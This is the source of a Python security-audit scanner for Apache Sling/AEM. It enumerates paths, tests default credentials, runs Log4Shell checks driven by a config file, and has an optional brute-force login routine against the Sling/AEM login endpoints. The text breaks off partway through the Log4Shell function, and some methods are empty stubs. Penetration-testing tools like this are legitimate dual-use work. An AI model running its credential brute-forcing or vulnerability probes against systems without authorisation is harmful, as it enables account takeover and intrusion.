#!/usr/bin/env python3
"""
Apache Sling Enumeration and Audit Script

This script performs enumeration and security auditing of Apache Sling instances.
It checks for common misconfigurations, default credentials, and potential security vulnerabilities.

Usage:
    python sling_audit.py -t <target_url> [options]

Example:
    python sling_audit.py -t http://example.com:4502 -u admin -p admin -v
"""

import argparse
import asyncio
import json
import os
import random
import re
import string
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Union
from urllib.parse import quote, urlencode, urljoin, urlparse, parse_qs
from dataclasses import dataclass

import aiohttp
import requests
import yaml
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from tqdm import tqdm
from email.utils import parsedate_to_datetime

# Initialize colorama for cross-platform colored output
init()

@dataclass
class AsyncResponse:
    """Wrapper for async HTTP response data"""
    status: int
    headers: Dict[str, str]
    text: str
    url: str
    
    def get(self, key: str, default: Optional[str] = None) -> Optional[str]:
        """Get header value by key"""
        return self.headers.get(key, default)


class AsyncRateLimiter:
    """Simple token bucket rate limiter for async operations"""

    def __init__(self, rate_per_sec: float, burst: Optional[float] = None) -> None:
        self.rate = max(0.0, rate_per_sec)
        self.capacity = max(burst if burst else self.rate or 1.0, 1.0)
        self.tokens = self.capacity
        self.updated = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self) -> None:
        """Wait until a token is available"""
        if self.rate <= 0:
            return

        while True:
            async with self._lock:
                now = time.monotonic()
                elapsed = now - self.updated
                if elapsed > 0:
                    self.tokens = min(self.capacity, self.tokens + elapsed * self.rate)
                    self.updated = now

                if self.tokens >= 1:
                    self.tokens -= 1
                    return

                wait_time = (1 - self.tokens) / self.rate if self.rate else 0

            if wait_time > 0:
                await asyncio.sleep(wait_time)
            else:
                await asyncio.sleep(0)

class SlingAuditor:
    """Apache Sling security auditor with enhanced features"""

    def __init__(self, target_url: str, username: Optional[str] = None, password: Optional[str] = None,
                 timeout: int = 10, verify_ssl: bool = False, verbose: bool = False, 
                 threads: int = 5, user_agent: Optional[str] = None, cookies: Optional[Union[str, dict]] = None,
                 proxy: Optional[str] = None, output_dir: Optional[str] = None, wordlist: Optional[str] = None,
                 exploit: bool = False, brute_force: bool = False, username_wordlist: Optional[str] = None,
                 password_wordlist: Optional[str] = None):
        """Initialize the auditor with enhanced configuration"""
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.threads = max(1, threads)
        self.proxy = proxy
        self.output_dir = output_dir or 'scan_results'
        self.wordlist_path = wordlist
        self.exploit_mode = exploit
        self.brute_force_enabled = brute_force
        self.username_wordlist_path = username_wordlist
        self.password_wordlist_path = password_wordlist
        
        # Create output directory if it doesn't exist
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        
        # Initialize rich console for better output
        self.console = Console()
        
        # Setup async session for concurrent requests
        self.async_session = None
        self.user_thread_limit = self.threads
        self.semaphore = asyncio.Semaphore(self.threads)
        self.rate_limiter: Optional[AsyncRateLimiter] = None
        self.mode_settings: Dict[str, Union[int, float]] = {}
        self.backoff_until: float = 0.0
        self.max_backoff: float = 60.0
        
        # Setup regular session
        self.session = requests.Session()
        self.setup_session(user_agent, cookies)
        
        # Load configuration
        self.config = self.load_config()
        
        # Load wordlist if provided
        self.wordlist = self.load_wordlist() if wordlist else []
        
        # Initialize results dictionary
        self.results = self.initialize_results()

    def load_config(self) -> dict:
        """Load configuration from YAML file"""
        config_path = Path(__file__).parent / 'config' / 'audit_config.yaml'
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                return yaml.safe_load(f)
        return {}

    def load_wordlist(self) -> List[str]:
        """Load wordlist from file"""
        if not self.wordlist_path:
            return []
        
        wordlist_file = Path(self.wordlist_path)
        if not wordlist_file.exists():
            self.log(f"Wordlist file not found: {self.wordlist_path}", "WARNING", Fore.YELLOW)
            return []
        
        paths = []
        try:
            with open(wordlist_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    # Skip empty lines and comments
                    if line and not line.startswith('#'):
                        # Only add paths that start with /
                        if line.startswith('/'):
                            paths.append(line)
                        # Also handle query parameters and extensions
                        elif line.startswith('?') or line.startswith('.'):
                            # These will be handled separately if needed
                            pass
            self.log(f"Loaded {len(paths)} paths from wordlist: {self.wordlist_path}", "INFO", Fore.GREEN)
            return paths
        except Exception as e:
            self.log(f"Error loading wordlist: {str(e)}", "ERROR", Fore.RED)
            return []

    def initialize_results(self) -> dict:
        """Initialize results dictionary with enhanced structure"""
        return {
            'scan_info': {
                'target': self.target_url,
                'start_time': datetime.now().isoformat(),
                'end_time': None,
                'duration': None,
                'scan_mode': None
            },
            'target_info': {
                'is_sling': False,
                'version': None,
                'product_info': {},
                'detection_confidence': 0
            },
            'security_findings': {
                'critical': [],
                'high': [],
                'medium': [],
                'low': [],
                'info': []
            },
            'vulnerabilities': [],
            'exposed_apis': [],
            'authentication': {
                'auth_required_paths': [],
                'credentials_tested': [],
                'valid_credentials': [],
                'brute_force_results': {
                    'enabled': False,
                    'attempts_made': 0,
                    'valid_credentials_found': [],
                    'lockouts_detected': [],
                    'failed_attempts': 0
                }
            },
            'configuration': {
                'osgi_configs': [],
                'dispatcher_config': {},
                'replication_agents': []
            },
            'content_security': {
                'exposed_paths': [],
                'sensitive_content': [],
                'jcr_structure': {}
            }
        }

    def setup_session(self, user_agent: Optional[str], cookies: Optional[Union[str, dict]]) -> None:
        """Setup session with enhanced security headers"""
        self.session.headers.update({
            'User-Agent': user_agent or 'SlingAuditor/2.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        
        if cookies:
            if isinstance(cookies, str):
                cookie_dict = dict(item.split('=', 1) for item in cookies.split(';') if '=' in item)
                self.session.cookies.update(cookie_dict)
            elif isinstance(cookies, dict):
                self.session.cookies.update(cookies)
        
        if self.proxy:
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }

    def configure_scan_mode(self, mode: str) -> None:
        """Apply concurrency and rate-limiting settings for the selected scan mode"""
        scan_modes = self.config.get('scan_modes', {})
        mode_config = scan_modes.get(mode, {}) or scan_modes.get('full', {})

        # Determine concurrency
        configured_concurrency = mode_config.get('concurrent_requests')
        if configured_concurrency:
            concurrency = min(self.user_thread_limit, max(1, configured_concurrency))
        else:
            concurrency = self.user_thread_limit
        self.semaphore = asyncio.Semaphore(concurrency)

        # Determine rate limit
        max_rps = mode_config.get('max_requests_per_second', 0)
        if max_rps and max_rps > 0:
            burst = mode_config.get('burst_size')
            if not burst:
                burst = max(max_rps * 2, concurrency)
            self.rate_limiter = AsyncRateLimiter(max_rps, burst)
        else:
            self.rate_limiter = None

        self.mode_settings = {
            'mode': mode,
            'max_requests_per_second': max_rps,
            'concurrent_requests': concurrency
        }

        self.log(
            f"Scan mode '{mode}' configured with {concurrency} concurrent requests "
            f"and {max_rps or 'unlimited'} req/s",
            "INFO",
            Fore.CYAN
        )

    async def setup_async_session(self) -> None:
        """Setup async session for concurrent requests"""
        if not self.async_session:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            connector = aiohttp.TCPConnector(verify_ssl=self.verify_ssl)
            self.async_session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=self.session.headers,
                cookies=self.session.cookies
            )

    def log(self, message: str, level: str = "INFO", color: str = Fore.WHITE) -> None:
        """Enhanced logging with color support"""
        if self.verbose or level in ["ERROR", "CRITICAL"]:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_message = f"[{timestamp}] [{level}] {message}"
            print(f"{color}{log_message}{Style.RESET_ALL}")

    async def _respect_rate_limit(self) -> None:
        """Apply global rate limiting and server-directed backoff"""
        if self.backoff_until:
            wait_for = self.backoff_until - time.monotonic()
            if wait_for > 0:
                await asyncio.sleep(wait_for)
            self.backoff_until = 0.0

        if self.rate_limiter:
            await self.rate_limiter.acquire()

    def _parse_retry_after(self, retry_after: str) -> Optional[float]:
        """Parse Retry-After header and return seconds to wait"""
        if not retry_after:
            return None

        retry_after = retry_after.strip()
        if not retry_after:
            return None

        try:
            return max(0.0, float(retry_after))
        except ValueError:
            try:
                retry_dt = parsedate_to_datetime(retry_after)
                if retry_dt.tzinfo is None:
                    retry_dt = retry_dt.replace(tzinfo=timezone.utc)
                delta = (retry_dt - datetime.now(timezone.utc)).total_seconds()
                return max(0.0, delta)
            except Exception:
                return None

    def _register_server_backoff(self, status: int, headers: Dict[str, str]) -> None:
        """Honor Retry-After or add adaptive backoff when server asks for slow down"""
        retry_after = headers.get('Retry-After')
        wait_time = self._parse_retry_after(retry_after) if retry_after else None

        if wait_time is None:
            if status == 429:
                wait_time = 10.0
            elif status in (503, 504):
                wait_time = 5.0
            else:
                wait_time = 0.0

        if wait_time <= 0:
            return

        wait_time = min(wait_time, self.max_backoff)
        new_deadline = time.monotonic() + wait_time
        if new_deadline > self.backoff_until:
            self.backoff_until = new_deadline
            self.log(
                f"Server responded with {status}. Respecting Retry-After for {wait_time:.2f}s",
                "WARNING",
                Fore.YELLOW
            )

    async def async_request(self, path: str, method: str = 'GET', headers: Optional[Dict[str, str]] = None, **kwargs) -> Optional[AsyncResponse]:
        """Make an async request with error handling
        
        Returns an AsyncResponse object with status, headers, and text content.
        All data is read before the connection closes to avoid 'Connection closed' errors.
        
        Args:
            path: URL path to request
            method: HTTP method (GET, POST, etc.)
            headers: Optional custom headers dict (will be merged with session headers)
            **kwargs: Additional arguments passed to aiohttp request
        """
        url = urljoin(self.target_url, path)
        await self._respect_rate_limit()
        async with self.semaphore:
            try:
                # Merge custom headers with session headers
                request_headers = dict(self.async_session.headers)
                if headers:
                    request_headers.update(headers)
                
                async with self.async_session.request(method, url, headers=request_headers, **kwargs) as response:
                    # Read all response data while connection is still open
                    status = response.status
                    headers = dict(response.headers)
                    try:
                        text = await response.text()
                    except Exception as e:
                        self.log(f"Error reading response body for {url}: {str(e)}", "WARNING", Fore.YELLOW)
                        text = ""
                    
                    async_response = AsyncResponse(
                        status=status,
                        headers=headers,
                        text=text,
                        url=str(response.url)
                    )

                    if status in (429, 503, 504):
                        self._register_server_backoff(status, headers)

                    return async_response
            except asyncio.TimeoutError:
                self.log(f"Request timeout: {url}", "ERROR", Fore.RED)
                return None
            except aiohttp.ClientError as e:
                self.log(f"Request error: {url} - {str(e)}", "ERROR", Fore.RED)
                return None
            except Exception as e:
                self.log(f"Unexpected error: {url} - {str(e)}", "ERROR", Fore.RED)
                return None

    def add_finding(self, finding: dict) -> None:
        """Add a security finding with proper categorization"""
        severity = finding.get('severity', 'info').lower()
        if severity in self.results['security_findings']:
            self.results['security_findings'][severity].append(finding)
            
            if severity in ['critical', 'high']:
                self.log(
                    f"Found {severity.upper()} severity issue: {finding['name']}",
                    "CRITICAL" if severity == 'critical' else "HIGH",
                    Fore.RED if severity == 'critical' else Fore.YELLOW
                )

    async def check_paths_concurrently(self, paths: List[str]) -> None:
        """Check multiple paths concurrently"""
        async def check_single_path(path: str) -> None:
            response = await self.async_request(path)
            if response:
                if response.status == 200:
                    self.results['content_security']['exposed_paths'].append({
                        'path': path,
                        'status': response.status,
                        'content_type': response.get('Content-Type', 'unknown')
                    })
                elif response.status in [401, 403]:
                    self.results['authentication']['auth_required_paths'].append({
                        'path': path,
                        'status': response.status
                    })

        await asyncio.gather(*[check_single_path(path) for path in paths])

    async def check_wordlist_paths(self, task, progress) -> None:
        """Enumerate paths using wordlist"""
        if not self.wordlist:
            progress.update(task, advance=100, description="No wordlist provided")
            return
        
        total_paths = len(self.wordlist)
        progress.update(task, advance=10, description=f"Enumerating {total_paths} paths from wordlist...")
        
        # Process paths in batches to update progress
        batch_size = max(1, total_paths // 20)  # Update progress ~20 times
        found_paths = 0
        
        async def check_path(path: str) -> dict:
            """Check a single path and return result"""
            response = await self.async_request(path)
            if response:
                return {
                    'path': path,
                    'status': response.status,
                    'content_type': response.get('Content-Type', 'unknown'),
                    'content_length': len(response.text) if response.text else 0
                }
            return None
        
        # Check all paths concurrently
        results = await asyncio.gather(*[check_path(path) for path in self.wordlist])
        
        # Process results
        for i, result in enumerate(results):
            if result:
                if result['status'] == 200:
                    self.results['content_security']['exposed_paths'].append({
                        'path': result['path'],
                        'status': result['status'],
                        'content_type': result['content_type'],
                        'content_length': result['content_length']
                    })
                    found_paths += 1
                    if self.verbose:
                        self.log(f"Found accessible path: {result['path']} (Status: {result['status']})", "INFO", Fore.GREEN)
                elif result['status'] in [401, 403]:
                    self.results['authentication']['auth_required_paths'].append({
                        'path': result['path'],
                        'status': result['status']
                    })
            
            # Update progress periodically
            if (i + 1) % batch_size == 0 or (i + 1) == total_paths:
                progress.update(task, advance=90 * batch_size / total_paths,
                              description=f"Wordlist: {i + 1}/{total_paths} paths checked, {found_paths} found")
        
        progress.update(task, advance=100, description=f"Wordlist enumeration complete: {found_paths} accessible paths found")
        self.log(f"Wordlist enumeration complete: {found_paths} accessible paths found out of {total_paths} tested", "INFO", Fore.CYAN)

    async def run_security_checks(self) -> None:
        """Run comprehensive security checks concurrently"""
        # Implement security checks here
        pass

    def generate_report(self) -> None:
        """Generate comprehensive security report"""
        # Create report directory
        report_dir = Path(self.output_dir) / datetime.now().strftime("%Y%m%d_%H%M%S")
        report_dir.mkdir(parents=True, exist_ok=True)
        
        # Save detailed JSON report
        json_report = report_dir / "detailed_report.json"
        with open(json_report, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Generate HTML report
        self.generate_html_report(report_dir)
        
        # Generate summary report
        self.generate_summary_report(report_dir)

    def generate_html_report(self, report_dir: Path) -> None:
        """Generate HTML report with enhanced visualization"""
        # Implement HTML report generation
        pass

    def generate_summary_report(self, report_dir: Path) -> None:
        """Generate executive summary report"""
        # Implement summary report generation
        pass

    async def run_audit(self, mode: str = 'full') -> dict:
        """Run the complete Sling audit with async support"""
        self.results['scan_info']['scan_mode'] = mode
        start_time = time.time()
        
        try:
            self.configure_scan_mode(mode)
            # Setup async session
            await self.setup_async_session()
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=self.console
            ) as progress:
                # Run security checks based on mode
                if mode == 'quick':
                    await self.run_quick_scan(progress)
                elif mode == 'stealth':
                    await self.run_stealth_scan(progress)
                else:
                    await self.run_full_scan(progress)
            
        finally:
            if self.async_session:
                await self.async_session.close()
            
            # Record scan completion
            end_time = time.time()
            self.results['scan_info']['end_time'] = datetime.now().isoformat()
            self.results['scan_info']['duration'] = end_time - start_time
            
            # Generate reports
            self.generate_report()
        
        return self.results

    async def run_quick_scan(self, progress) -> None:
        """Run a quick scan with basic checks"""
        task1 = progress.add_task("Running quick scan...", total=3)
        
        # Version detection
        progress.update(task1, advance=1, description="Checking version...")
        await self.check_version()
        
        # Basic auth check
        progress.update(task1, advance=1, description="Checking basic auth...")
        await self.check_basic_auth()
        
        # Critical vulnerabilities
        progress.update(task1, advance=1, description="Checking critical vulnerabilities...")
        await self.check_critical_vulnerabilities()

    async def run_stealth_scan(self, progress) -> None:
        """Run a stealth scan with minimal footprint"""
        task1 = progress.add_task("Running stealth scan...", total=3)
        
        # Passive version detection
        progress.update(task1, advance=1, description="Passive version detection...")
        await self.check_version_passive()
        
        # Basic auth check with delays
        progress.update(task1, advance=1, description="Checking authentication...")
        await self.check_basic_auth(stealth=True)
        
        # Safe checks only
        progress.update(task1, advance=1, description="Running safe checks...")
        await self.run_safe_checks()

    async def run_full_scan(self, progress) -> None:
        """Run a comprehensive security scan"""
        # Create progress tasks for each major check category
        tasks = {
            'version': progress.add_task("Version detection...", total=100),
            'auth': progress.add_task("Authentication checks...", total=100),
            'vulns': progress.add_task("Vulnerability scanning...", total=100),
            'apis': progress.add_task("API enumeration...", total=100),
            'config': progress.add_task("Configuration audit...", total=100),
            'content': progress.add_task("Content security...", total=100)
        }
        
        # Add wordlist enumeration task if wordlist is provided
        if self.wordlist:
            tasks['wordlist'] = progress.add_task("Wordlist enumeration...", total=100)
        
        # Prepare tasks to run
        scan_tasks = [
            self.check_version_full(tasks['version'], progress),
            self.check_authentication(tasks['auth'], progress),
            self.check_vulnerabilities_full(tasks['vulns'], progress),
            self.check_exposed_apis_full(tasks['apis'], progress),
            self.check_configuration_full(tasks['config'], progress),
            self.check_content_security(tasks['content'], progress)
        ]
        
        # Add wordlist enumeration if wordlist is provided
        if self.wordlist:
            scan_tasks.append(self.check_wordlist_paths(tasks['wordlist'], progress))
        
        # Run checks concurrently
        await asyncio.gather(*scan_tasks)

    async def check_version(self) -> None:
        """Basic version detection"""
        paths = [
            '/system/console/productinfo',
            '/libs/cq/core/content/welcome.html'
        ]
        
        for path in paths:
            response = await self.async_request(path)
            if response and response.status == 200:
                # Check for version indicators
                version_match = re.search(r'Adobe Experience Manager \(([^)]+)\)', response.text)
                if version_match:
                    self.results['target_info']['version'] = version_match.group(1)
                    return

    async def check_version_passive(self) -> None:
        """Passive version detection without direct probing"""
        response = await self.async_request('/')
        if response:
            server = response.get('Server', '')
            powered_by = response.get('X-Powered-By', '')
            
            if any(indicator in server + powered_by for indicator in ['Adobe', 'Day-Servlet', 'CQ']):
                self.results['target_info']['is_sling'] = True
                self.add_finding({
                    'name': 'Version Information Disclosure',
                    'severity': 'low',
                    'description': f'Server headers reveal technology: {server} {powered_by}'
                })

    async def check_version_full(self, task, progress) -> None:
        """Comprehensive version detection"""
        progress.update(task, advance=20, description="Checking product info...")
        await self.check_version()
        
        progress.update(task, advance=20, description="Analyzing response headers...")
        await self.check_version_passive()
        
        progress.update(task, advance=20, description="Checking additional endpoints...")
        # Add more version detection methods
        
        progress.update(task, advance=40, description="Version detection complete")

    async def check_basic_auth(self, stealth: bool = False) -> None:
        """Check for basic authentication issues"""
        if stealth:
            await asyncio.sleep(2)  # Add delay for stealth mode
        
        auth_paths = self.config.get('paths', {}).get('core_endpoints', [])
        for endpoint in auth_paths:
            response = await self.async_request(endpoint['path'])
            if response and response.status in [401, 403]:
                self.results['authentication']['auth_required_paths'].append({
                    'path': endpoint['path'],
                    'name': endpoint['name'],
                    'status': response.status
                })

    async def check_critical_vulnerabilities(self) -> None:
        """Check for critical vulnerabilities only"""
        critical_vulns = {k: v for k, v in self.config.get('vulnerabilities', {}).items() 
                         if v.get('severity') == 'critical'}
        
        for vuln_id, vuln_info in critical_vulns.items():
            vuln_type = vuln_info.get('type', 'generic')
            
            # Special handling for Log4Shell
            if vuln_id == 'CVE-2021-44228':
                await self.check_log4shell(None, None, vuln_info)
            # Specialized tests based on vulnerability type
            elif vuln_type == 'xss':
                await self.check_xss_vulnerability(vuln_id, vuln_info)
            elif vuln_type == 'ssrf':
                await self.check_ssrf_vulnerability(vuln_id, vuln_info)
            elif vuln_type == 'path_traversal':
                await self.check_path_traversal_vulnerability(vuln_id, vuln_info)
            elif vuln_type == 'info_disclosure':
                await self.check_info_disclosure_vulnerability(vuln_id, vuln_info)
            else:
                await self.check_generic_vulnerability(vuln_id, vuln_info)

    async def run_safe_checks(self) -> None:
        """Run only safe checks that won't impact the target"""
        safe_paths = [
            '/.json',
            '/libs/cq/core/content/welcome.html',
            '/content.json'
        ]
        
        for path in safe_paths:
            response = await self.async_request(path)
            if response and response.status == 200:
                self.add_finding({
                    'name': f'Exposed Endpoint: {path}',
                    'severity': 'low',
                    'description': f'The endpoint {path} is publicly accessible'
                })

    async def check_authentication(self, task, progress) -> None:
        """Comprehensive authentication checks"""
        progress.update(task, advance=20, description="Testing default credentials...")
        
        # Test default credentials
        for cred in self.config.get('credentials', []):
            if self.results['authentication']['auth_required_paths']:
                test_path = self.results['authentication']['auth_required_paths'][0]['path']
                response = await self.async_request(
                    test_path,
                    auth=aiohttp.BasicAuth(cred['username'], cred['password'])
                )
                if response and response.status == 200:
                    self.results['authentication']['valid_credentials'].append({
                        'username': cred['username'],
                        'password': cred['password'],
                        'description': cred['description']
                    })
        
        progress.update(task, advance=20, description="Checking session handling...")
        # Add session handling checks
        
        # Brute force testing if enabled
        if self.brute_force_enabled:
            progress.update(task, advance=20, description="Running brute force attack...")
            await self.brute_force_login(task, progress)
        else:
            progress.update(task, advance=20, description="Brute force disabled (use --brute-force to enable)")
        
        progress.update(task, advance=40, description="Authentication checks complete")

    async def brute_force_login(self, task=None, progress=None) -> None:
        """Brute force Apache Sling login with wordlist support"""
        if not self.brute_force_enabled:
            return
        
        self.log("Starting Apache Sling login brute force attack...", "INFO", Fore.CYAN)
        
        brute_config = self.config.get('brute_force', {})
        if not brute_config.get('enabled', False):
            self.log("Brute force is disabled in configuration", "WARNING", Fore.YELLOW)
            return
        
        # Load username wordlist
        usernames = []
        if self.username_wordlist_path:
            usernames = self.load_wordlist_file(self.username_wordlist_path)
        else:
            usernames = brute_config.get('username_wordlist', ['admin', 'administrator'])
        
        # Load password wordlist
        passwords = []
        if self.password_wordlist_path:
            passwords = self.load_wordlist_file(self.password_wordlist_path)
        else:
            passwords = brute_config.get('password_wordlist', ['admin', 'password', '123456'])
        
        login_endpoints = brute_config.get('login_endpoints', [
            '/system/sling/login',
            '/libs/granite/core/content/login.html'
        ])
        
        max_attempts = brute_config.get('max_attempts_per_user', 10)
        delay = brute_config.get('delay_between_attempts', 1.0)
        lockout_detection = brute_config.get('lockout_detection', {}).get('enabled', True)
        lockout_indicators = brute_config.get('lockout_detection', {}).get('lockout_indicators', [])
        
        self.log(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords", "INFO", Fore.CYAN)
        self.log(f"Testing against {len(login_endpoints)} login endpoints", "INFO", Fore.CYAN)
        
        valid_credentials = []
        lockouts_detected = []
        attempts_made = 0
        failed_attempts = 0
        
        # Limit attempts to avoid excessive testing
        total_combinations = min(len(usernames) * len(passwords), max_attempts * len(usernames))
        
        for username in usernames:
            if progress and task:
                progress.update(task, advance=1, description=f"Brute forcing user: {username}...")
            
            attempts_for_user = 0
            user_locked = False
            
            for password in passwords[:max_attempts]:  # Limit attempts per user
                if user_locked:
                    break
                
                attempts_made += 1
                attempts_for_user += 1
                
                # Test each login endpoint
                for endpoint in login_endpoints:
                    try:
                        # Try form-based login (POST request)
                        login_success = await self.test_form_login(endpoint, username, password)
                        
                        if not login_success:
                            # Try basic auth
                            login_success = await self.test_basic_auth_login(endpoint, username, password)
                        
                        if login_success:
                            valid_credentials.append({
                                'username': username,
                                'password': password,
                                'endpoint': endpoint,
                                'method': 'form' if login_success else 'basic_auth'
                            })
                            self.log(
                                f"✓ Valid credentials found: {username}:{password} on {endpoint}",
                                "WARNING",
                                Fore.RED
                            )
                            # Found valid creds, move to next user
                            break
                        else:
                            failed_attempts += 1
                            
                            # Check for lockout indicators
                            if lockout_detection:
                                # We'd need to check response, but for now we'll track attempts
                                if attempts_for_user >= max_attempts:
                                    lockouts_detected.append({
                                        'username': username,
                                        'endpoint': endpoint,
                                        'reason': 'Max attempts reached'
                                    })
                                    user_locked = True
                                    self.log(f"Possible account lockout for user: {username}", "WARNING", Fore.YELLOW)
                                    break
                        
                        # Rate limiting delay
                        await asyncio.sleep(delay)
                        
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Error testing {username}:{password} on {endpoint}: {str(e)}", "WARNING", Fore.YELLOW)
                        failed_attempts += 1
                
                # If we found valid credentials, stop testing this user
                if any(cred['username'] == username for cred in valid_credentials):
                    break
            
            # Additional delay between users
            if username != usernames[-1]:
                await asyncio.sleep(delay * 2)
        
        # Update results
        self.results['authentication']['brute_force_results'] = {
            'enabled': True,
            'attempts_made': attempts_made,
            'valid_credentials_found': valid_credentials,
            'lockouts_detected': lockouts_detected,
            'failed_attempts': failed_attempts,
            'usernames_tested': len(usernames),
            'passwords_tested': len(passwords)
        }
        
        # Add valid credentials to main results
        for cred in valid_credentials:
            self.results['authentication']['valid_credentials'].append({
                'username': cred['username'],
                'password': cred['password'],
                'description': f'Found via brute force on {cred["endpoint"]}',
                'source': 'brute_force'
            })
        
        # Report findings
        if valid_credentials:
            self.add_finding({
                'name': 'Brute Force Attack - Valid Credentials Found',
                'severity': 'critical',
                'description': f'Brute force attack discovered {len(valid_credentials)} valid credential(s). This indicates weak password policies.',
                'remediation': 'Implement strong password policies, account lockout mechanisms, and rate limiting on login endpoints.',
                'test_details': {
                    'valid_credentials': valid_credentials,
                    'total_attempts': attempts_made,
                    'success_rate': f"{(len(valid_credentials) / attempts_made * 100):.2f}%" if attempts_made > 0 else "0%"
                }
            })
            self.log(f"Brute force complete: {len(valid_credentials)} valid credential(s) found!", "WARNING", Fore.RED)
        else:
            self.log(f"Brute force complete: No valid credentials found ({attempts_made} attempts made)", "INFO", Fore.GREEN)
        
        if lockouts_detected:
            self.log(f"Account lockouts detected for {len(lockouts_detected)} user(s)", "WARNING", Fore.YELLOW)

    async def test_form_login(self, endpoint: str, username: str, password: str) -> bool:
        """Test form-based login (POST request)"""
        login_url = urljoin(self.target_url, endpoint)
        
        # Common form field names for Apache Sling/AEM
        form_data = {
            'j_username': username,
            'j_password': password,
            'j_validate': 'true',
            '_charset_': 'UTF-8'
        }
        
        # Alternative field names
        alt_form_data = {
            'username': username,
            'password': password,
            'login': 'true'
        }
        
        try:
            # Try primary form fields
            async with self.semaphore:
                async with self.async_session.post(login_url, data=form_data, allow_redirects=False) as response:
                    # Read response data while connection is open
                    status = response.status
                    headers = dict(response.headers)
                    try:
                        response_text = await response.text()
                    except:
                        response_text = ""
                    
                    # Check for successful login indicators
                    if status in [200, 302, 303]:
                        # Success indicators
                        success_indicators = [
                            'location' in headers and 'login' not in headers.get('location', '').lower(),
                            'set-cookie' in headers,
                            'authenticated' in response_text.lower() if response_text else False,
                            'welcome' in response_text.lower() if response_text else False,
                            status == 302 and 'error' not in headers.get('location', '').lower()
                        ]
                        
                        if any(success_indicators):
                            return True
                    
                    # Try alternative form fields
                    async with self.async_session.post(login_url, data=alt_form_data, allow_redirects=False) as alt_response:
                        alt_status = alt_response.status
                        alt_headers = dict(alt_response.headers)
                        if alt_status in [200, 302, 303]:
                            if 'set-cookie' in alt_headers or (alt_status == 302 and 'error' not in alt_headers.get('location', '').lower()):
                                return True
        except Exception as e:
            if self.verbose:
                self.log(f"Form login test error: {str(e)}", "WARNING", Fore.YELLOW)
        
        return False

    async def test_basic_auth_login(self, endpoint: str, username: str, password: str) -> bool:
        """Test basic authentication login"""
        try:
            response = await self.async_request(
                endpoint,
                auth=aiohttp.BasicAuth(username, password)
            )
            
            if response:
                # Success indicators for basic auth
                if response.status == 200:
                    # Check if we got actual content (not an error page)
                    if len(response.text) > 100 and 'error' not in response.text.lower()[:200]:
                        return True
                elif response.status == 401:
                    return False  # Authentication failed
        except Exception as e:
            if self.verbose:
                self.log(f"Basic auth test error: {str(e)}", "WARNING", Fore.YELLOW)
        
        return False

    def load_wordlist_file(self, file_path: str) -> List[str]:
        """Load wordlist from file (for usernames or passwords)"""
        wordlist_file = Path(file_path)
        if not wordlist_file.exists():
            self.log(f"Wordlist file not found: {file_path}", "WARNING", Fore.YELLOW)
            return []
        
        items = []
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        items.append(line)
            self.log(f"Loaded {len(items)} items from wordlist: {file_path}", "INFO", Fore.GREEN)
            return items
        except Exception as e:
            self.log(f"Error loading wordlist: {str(e)}", "ERROR", Fore.RED)
            return []

    async def check_vulnerabilities_full(self, task, progress) -> None:
        """Comprehensive vulnerability scanning with improved detection"""
        progress.update(task, advance=10, description="Checking known vulnerabilities...")
        
        vulnerabilities = self.config.get('vulnerabilities', {})
        total_vulns = len(vulnerabilities)
        vuln_count = 0
        
        # Check all vulnerabilities from config
        for vuln_id, vuln_info in vulnerabilities.items():
            vuln_count += 1
            vuln_type = vuln_info.get('type', 'generic')
            
            # Special handling for Log4Shell
            if vuln_id == 'CVE-2021-44228':
                await self.check_log4shell(task, progress, vuln_info)
            # Specialized tests based on vulnerability type
            elif vuln_type == 'xss':
                await self.check_xss_vulnerability(vuln_id, vuln_info)
            elif vuln_type == 'ssrf':
                await self.check_ssrf_vulnerability(vuln_id, vuln_info)
            elif vuln_type == 'path_traversal':
                await self.check_path_traversal_vulnerability(vuln_id, vuln_info)
            elif vuln_type == 'info_disclosure':
                await self.check_info_disclosure_vulnerability(vuln_id, vuln_info)
            else:
                # Generic vulnerability check with response analysis
                await self.check_generic_vulnerability(vuln_id, vuln_info)
            
            # Update progress
            if progress and task:
                progress_pct = int((vuln_count / total_vulns) * 50) if total_vulns > 0 else 0
                progress.update(task, advance=progress_pct, 
                              description=f"Checking vulnerabilities: {vuln_count}/{total_vulns}...")
        
        progress.update(task, advance=50, description="Vulnerability scan complete")

    async def check_log4shell(self, task=None, progress=None, vuln_info: dict = None) -> None:
        """Optimized test for Log4Shell (CVE-2021-44228) vulnerability using OOB payloads
        
        Features:
        - Prioritized payload testing (DNS first, then LDAP, then obfuscated)
        - Prioritized injection points (most common headers first)
        - Response time analysis to detect Log4j lookup delays
        - Response pattern detection for Log4j error messages
        - Rate limiting to avoid overwhelming the target
        """
        if vuln_info is None:
            vuln_info = self.config.get('vulnerabilities', {}).get('CVE-2021-44228', {})
        
        if progress and task:
            progress.update(task, advance=5, description="Testing Log4Shell vulnerability...")
        else:
            self.log("Testing Log4Shell vulnerability...", "INFO", Fore.CYAN)
        
        test_paths = vuln_info.get('test_paths', ['/system/console/status-slingsettings.json'])
        payloads = vuln_info.get('payloads', [])
        oob_domain = vuln_info.get('oob_domain', '')
        injection_points = vuln_info.get('injection_points', {})
        
        if not payloads or not oob_domain:
